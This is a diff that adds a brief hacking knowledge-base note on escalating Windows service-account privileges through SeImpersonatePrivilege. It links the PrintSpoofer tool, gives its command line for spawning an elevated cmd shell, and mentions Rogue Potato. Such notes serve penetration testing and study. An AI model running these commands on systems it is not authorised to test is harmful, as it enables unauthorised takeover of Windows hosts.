@@ -1,0 +1,14 @@
+# service account privileges exploiting SeImpersonatePrivilege
+- https://github.com/itm4n/PrintSpoofer
+  ```powershell
+  PrintSpoofer64.exe -i -c cmd
+  ```
+- rogue potato (current) - lots of port forwarding
+
+# References
+- [20221003151076](/zet/20221003151076/) service account privileges exploiting
+- ~/kb/hacking/windows/service-account-privileges.md
+
+Tags:
+    #assorted
+
